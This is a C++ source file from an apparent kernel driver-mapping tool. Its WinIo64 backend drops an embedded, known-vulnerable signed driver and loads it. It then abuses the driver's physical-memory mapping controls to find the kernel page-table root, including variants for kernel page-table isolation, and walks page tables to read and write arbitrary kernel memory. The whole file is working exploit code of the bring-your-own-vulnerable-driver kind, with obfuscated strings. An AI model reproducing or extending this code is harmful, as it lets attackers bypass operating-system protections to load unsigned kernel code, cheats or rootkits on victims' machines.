#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_WINIO64)

#include "WinIo64Backend.h"
#include "../Common/VulnerableDriverLoader.h"
#include "winio64_sys.h"
#include "../DirectIO64/halamd64.h"
#include <algorithm>
#include <vector>

namespace
{
	constexpr DWORD WinIoMapPhysToLinIoctl  = 0x80102040;
	constexpr DWORD WinIoUnmapPhysAddrIoctl = 0x80102044;

#pragma pack(push, 1)
	struct WinIoMapRequest
	{
		uint64_t Size;             // offset 0x00: bytes to map
		uint64_t PhysicalAddress;  // offset 0x08
		uint64_t Handle;           // offset 0x10: out, section handle (driver)
		uint64_t LinearAddress;    // offset 0x18: out, mapped VA (driver)
		uint64_t SectionObject;    // offset 0x20: out, section object (driver)
	};
#pragma pack(pop)

	constexpr uint64_t PhysicalAddressMask           = 0x000ffffffffff000ull;
	constexpr uint64_t PhysicalAddressMask2MbPages   = 0x000fffffffe00000ull;
	constexpr uint64_t PhysicalAddressMask1GbPages   = 0x000fffffc0000000ull;
	constexpr uint64_t VirtualAddressMask2MbPages    = 0x00000000001fffffull;
	constexpr uint64_t VirtualAddressMask1GbPages    = 0x000000003fffffffull;
	constexpr uint64_t VirtualAddressMask4KbPages    = 0x0000000000000fffull;
	constexpr uint64_t EntryPageSizeBit              = 0x0000000000000080ull;
	constexpr uint64_t EntryPresentBit               = 0x0000000000000001ull;

	ULONG GetProcessorStartBlockCr3Offset( )
	{
		return FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
			FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );
	}

	ULONG ScanLowStubForPml4( const uint8_t* data, ULONG size )
	{
		const auto cr3Offset = GetProcessorStartBlockCr3Offset( );
		const auto lmTargetOffset = FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget );
		constexpr uint64_t maxPhysAddr = 0x10000000000ull;

		for ( ULONG i = 0; i < size; i += 0x1000 )
		{
			__try
			{
				const auto ptr = r_cast<uintptr_t>( data + i );

				if ( ptr + cr3Offset + 8 > r_cast<uintptr_t>( data ) + size )
					break;

				const auto cr3 = *r_cast<const uint64_t*>( ptr + cr3Offset );

				if ( cr3 == 0 || cr3 == 0xFFFFFFFFFFFFFFFFull )
					continue;

				if ( ( cr3 >> 52 ) != 0 )
					continue;

				const auto cr3Page = cr3 & PhysicalAddressMask;
				if ( !cr3Page || cr3Page >= maxPhysAddr )
					continue;

				if ( lmTargetOffset + 8 > 0x1000 )
					continue;

				const auto lmTarget = *r_cast<const uint64_t*>( ptr + lmTargetOffset );

				if ( ( lmTarget & 0xfffff80000000000ull ) != 0xfffff80000000000ull )
					continue;

				return i;
			}
			__except ( EXCEPTION_EXECUTE_HANDLER )
			{
				continue;
			}
		}

		return 0xFFFFFFFF;
	}

	uint64_t ReadPml4FromLowStub( const uint8_t* data, ULONG offset )
	{
		const auto cr3Offset = GetProcessorStartBlockCr3Offset( );
		return *r_cast<const uint64_t*>( data + offset + cr3Offset );
	}

	bool SafeMemcpy( void* dst, const void* src, size_t size )
	{
		__try
		{
			memcpy( dst, src, size );
			return true;
		}
		__except ( EXCEPTION_EXECUTE_HANDLER )
		{
			return false;
		}
	}
}

std::string WinIo64Backend::Name( ) const
{
	return pstra( "WinIo64" );
}

NTSTATUS WinIo64Backend::Load( )
{
	m_CallGate = KernelCallGate::NtQueryAtom;

	const auto status = KernelRwCallBackend::Load( );

	return status;
}

NTSTATUS WinIo64Backend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( winio64_sys, sizeof( winio64_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\WinIo" ),
		image.data( ), image.size( ), &m_Device, 0x91C0, pstra( "WinIo64" ) );
}

NTSTATUS WinIo64Backend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( pstra( "WinIo64" ) );
}

bool WinIo64Backend::MapPhysical( uint64_t physicalAddress, uint64_t size, uint64_t* virtualAddress )
{
	if ( !virtualAddress || !size )
		return false;

	*virtualAddress = 0;

	WinIoMapRequest request {};
	request.Size = size;
	request.PhysicalAddress = physicalAddress;
	request.Handle = 0;
	request.LinearAddress = 0;
	request.SectionObject = 0;

	if ( !DeviceIoControl( m_Device, WinIoMapPhysToLinIoctl, &request, sizeof( request ), &request, sizeof( request ), nullptr, nullptr ) )
	{
		//LOG_SEC( "[-] - [WinIo64] MapPhysical failed pa=0x%llx size=0x%llx gle=%lu", physicalAddress, size, GetLastError( ) );
		return false;
	}

	*virtualAddress = request.LinearAddress;
	return *virtualAddress != 0;
}

bool WinIo64Backend::UnmapPhysical( uint64_t virtualAddress )
{
	if ( !virtualAddress )
		return false;

	WinIoMapRequest request {};
	request.Size = 0;
	request.PhysicalAddress = 0;
	request.Handle = 0;
	request.LinearAddress = virtualAddress;
	request.SectionObject = 0;

	return DeviceIoControl( m_Device, WinIoUnmapPhysAddrIoctl, &request, sizeof( request ), &request, sizeof( request ), nullptr, nullptr ) != FALSE;
}

bool WinIo64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, uint64_t bytes, bool write )
{
	if ( !buffer || !bytes )
		return false;

	const auto pageOffset = physicalAddress & 0xFFF;
	const auto alignedPa = physicalAddress & ~0xFFFull;
	const auto mapSize = ( pageOffset + bytes + 0xFFF ) & ~0xFFFull;

	uint64_t mappedVa = 0;

	if ( !MapPhysical( alignedPa, mapSize, &mappedVa ) )
		return false;

	bool result = false;

	const auto ptr = r_cast<uint8_t*>( mappedVa ) + pageOffset;

	if ( write )
		result = SafeMemcpy( ptr, buffer, s_cast<size_t>( bytes ) );
	else
		result = SafeMemcpy( buffer, ptr, s_cast<size_t>( bytes ) );

	if ( !result )
		LOG_SEC( "[-] - [WinIo64] ReadWritePhysical exception pa=0x%llx size=0x%llx write=%d", physicalAddress, bytes, write ? 1 : 0 );

	UnmapPhysical( mappedVa );
	return result;
}

bool WinIo64Backend::ValidateCr3WithNtoskrnl( uint64_t cr3 )
{
	if ( !m_Ntoskrnl )
		return false;

	uint64_t testPa = 0;
	if ( !VirtualToPhysicalWithCr3( cr3, m_Ntoskrnl, &testPa ) )
		return false;

	if ( testPa == 0 || testPa >= 0x10000000000ull )
		return false;

	uint16_t mz = 0;
	if ( !ReadWritePhysical( testPa, &mz, sizeof( mz ), false ) )
		return false;

	return mz == 0x5A4D;
}

bool WinIo64Backend::QueryPml4( uint64_t* value )
{
	if ( !value )
		return false;

	if ( m_Pml4Cache )
	{
		*value = m_Pml4Cache;
		return true;
	}

	*value = 0;

	const ULONG mapSize = 0x1000000;
	uint64_t mappedVa = 0;

	if ( !MapPhysical( 0, mapSize, &mappedVa ) )
	{
		LOG_SEC( "[-] - [WinIo64] QueryPml4 failed to map low 16MB gle=%lu", GetLastError( ) );
		return false;
	}

	std::vector<uint8_t> lowMemory( mapSize );

	bool readOk = SafeMemcpy( lowMemory.data( ), r_cast<const void*>( mappedVa ), mapSize );

	if ( !readOk )
		LOG_SEC( "[-] - [WinIo64] QueryPml4 exception reading mapped low memory", 0 );

	UnmapPhysical( mappedVa );

	if ( !readOk )
		return false;

	const auto stubOffset = ScanLowStubForPml4( lowMemory.data( ), mapSize );

	if ( stubOffset != 0xFFFFFFFF )
	{
		const auto rawCr3 = ReadPml4FromLowStub( lowMemory.data( ), stubOffset );
		LOG_SEC( "[*] - [WinIo64] QueryPml4 low stub cr3=0x%llx offset=0x%X", rawCr3, stubOffset );

		if ( ValidateCr3WithNtoskrnl( rawCr3 ) )
		{
			m_Pml4Cache = rawCr3;
			*value = rawCr3;
			LOG_SEC( "[*] - [WinIo64] QueryPml4 validated pml4=0x%llx", *value );
			return true;
		}

		const auto cr3Pa = rawCr3 & PhysicalAddressMask;
		const auto pcid = rawCr3 & 0xFFFull;

		const uint64_t kptiCandidates[ 5 ] = {
			( cr3Pa + 0x1000 ) | pcid,
			( cr3Pa + 0x1000 ),
			( cr3Pa - 0x1000 ) | pcid,
			( cr3Pa - 0x1000 ),
			( cr3Pa + 0x1000 ) | ( pcid ^ 0x1000 ),
		};

		for ( int i = 0; i < 5; ++i )
		{
			if ( kptiCandidates[ i ] == rawCr3 )
				continue;

			if ( ValidateCr3WithNtoskrnl( kptiCandidates[ i ] ) )
			{
				m_Pml4Cache = kptiCandidates[ i ];
				*value = kptiCandidates[ i ];
				LOG_SEC( "[*] - [WinIo64] QueryPml4 KPTI kernel cr3=0x%llx (variant %d, user=0x%llx)",
					*value, i, rawCr3 );
				return true;
			}
		}

		LOG_SEC( "[-] - [WinIo64] Low stub CR3 and KPTI variants all failed validation", 0 );
	}

	LOG_SEC( "[*] - [WinIo64] Scanning low 16MB for CR3 candidates", 0 );

	const uint64_t validationVa = m_Ntoskrnl;
	if ( !validationVa )
	{
		LOG_SEC( "[-] - [WinIo64] No validation VA (ntoskrnl=0)", 0 );
		return false;
	}

	constexpr uint64_t maxValidPa = 0x10000000000ull;
	const auto p = r_cast<const uint64_t*>( lowMemory.data( ) );
	const size_t qwordCount = mapSize / sizeof( uint64_t );

	ULONG tested = 0;
	for ( size_t i = 0; i < qwordCount; ++i )
	{
		const auto candidate = p[ i ];

		if ( candidate == 0 || candidate == 0xFFFFFFFFFFFFFFFFull )
			continue;

		if ( ( candidate >> 52 ) != 0 )
			continue;

		const auto candidatePa = candidate & PhysicalAddressMask;
		if ( !candidatePa || candidatePa >= maxValidPa )
			continue;

		if ( candidatePa < 0x1000 )
			continue;

		if ( !ValidateCr3WithNtoskrnl( candidate ) )
			continue;

		++tested;

		m_Pml4Cache = candidate;
		*value = candidate;
		LOG_SEC( "[*] - [WinIo64] QueryPml4 found pml4=0x%llx at offset=0x%llx (tested=%lu)",
			*value, i * 8, tested );
		return true;
	}

	LOG_SEC( "[-] - [WinIo64] QueryPml4 failed to find PML4 (tested=%lu candidates)", tested );
	return false;
}

bool WinIo64Backend::PageEntryToPhysicalAddress( uint64_t entry, uint64_t* physicalAddress )
{
	if ( entry & EntryPresentBit )
	{
		*physicalAddress = entry & PhysicalAddressMask;
		return true;
	}

	return false;
}

bool WinIo64Backend::VirtualToPhysicalWithCr3( uint64_t cr3, uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	*physicalAddress = 0;

	auto table = cr3 & PhysicalAddressMask;
	uint64_t entry = 0;

	for ( int r = 0; r < 4; r++ )
	{
		const auto shift = 39 - ( r * 9 );
		const auto selector = ( virtualAddress >> shift ) & 0x1ff;

		if ( !ReadWritePhysical( table + selector * sizeof( uint64_t ), &entry, sizeof( entry ), false ) )
			return false;

		if ( !PageEntryToPhysicalAddress( entry, &table ) )
			return false;

		if ( r == 1 && ( entry & EntryPageSizeBit ) )
		{
			table &= PhysicalAddressMask1GbPages;
			table += virtualAddress & VirtualAddressMask1GbPages;
			*physicalAddress = table;
			return true;
		}

		if ( r == 2 && ( entry & EntryPageSizeBit ) )
		{
			table &= PhysicalAddressMask2MbPages;
			table += virtualAddress & VirtualAddressMask2MbPages;
			*physicalAddress = table;
			return true;
		}
	}

	table += virtualAddress & VirtualAddressMask4KbPages;
	*physicalAddress = table;
	return true;
}

bool WinIo64Backend::VirtualToPhysicalByTableWalk( uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	uint64_t pml4 = 0;

	if ( !QueryPml4( &pml4 ) )
	{
		LOG_SEC( "[-] - [WinIo64] VirtualToPhysicalByTableWalk failed QueryPml4 va=0x%llx", virtualAddress );
		return false;
	}

	if ( !VirtualToPhysicalWithCr3( pml4, virtualAddress, physicalAddress ) )
	{
		LOG_SEC( "[-] - [WinIo64] VirtualToPhysicalByTableWalk failed va=0x%llx pml4=0x%llx", virtualAddress, pml4 );
		return false;
	}

	return true;
}

bool WinIo64Backend::ReadWriteVirtual( uint64_t address, void* buffer, size_t size, bool write )
{
	auto bytes = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint64_t physical = 0;
		const auto currentAddress = address + offset;
		const auto pageLeft = 0x1000 - ( currentAddress & 0xFFF );
		const auto chunk = std::min<uint64_t>( pageLeft, size - offset );

		if ( !VirtualToPhysicalByTableWalk( currentAddress, &physical ) )
			return false;

		if ( !ReadWritePhysical( physical, bytes + offset, chunk, write ) )
			return false;

		offset += s_cast<size_t>( chunk );
	}

	return true;
}

bool WinIo64Backend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	// Session-space drivers (win32kfull etc.) have pageable regions; a PTE with
	// present=0 means the page is paged out. Zero-fill those and retry later
	// instead of failing the whole read.
	auto bytes = r_cast<uint8_t*>( buffer );

	for ( int attempt = 0; attempt < 3; ++attempt )
	{
		if ( attempt > 0 )
			Sleep( 200 );

		size_t offset = 0;
		size_t failed = 0;

		while ( offset < size )
		{
			const auto currentAddress = address + offset;
			const auto pageLeft = 0x1000 - ( currentAddress & 0xFFF );
			const auto chunk = s_cast<size_t>( std::min<uint64_t>( pageLeft, size - offset ) );

			if ( !ReadWriteVirtual( currentAddress, bytes + offset, chunk, false ) )
			{
				memset( bytes + offset, 0, chunk );
				++failed;
			}

			offset += chunk;
		}

		if ( failed == 0 )
			return true;

		LOG_SEC( "[*] - [WinIo64] ReadMemory %zu/%zu pages paged out va=0x%llx (attempt %d)", failed, ( size + 0xFFF ) / 0x1000, address, attempt + 1 );
	}

	return false;
}

bool WinIo64Backend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, const_cast<void*>( buffer ), size, true );

	if ( !result )
		LOG_SEC( "[-] - [WinIo64] WriteMemory failed va=0x%llx size=0x%llx", address, size );

	return result;
}




#endif // KZEROMAPPER_ENABLE_WINIO64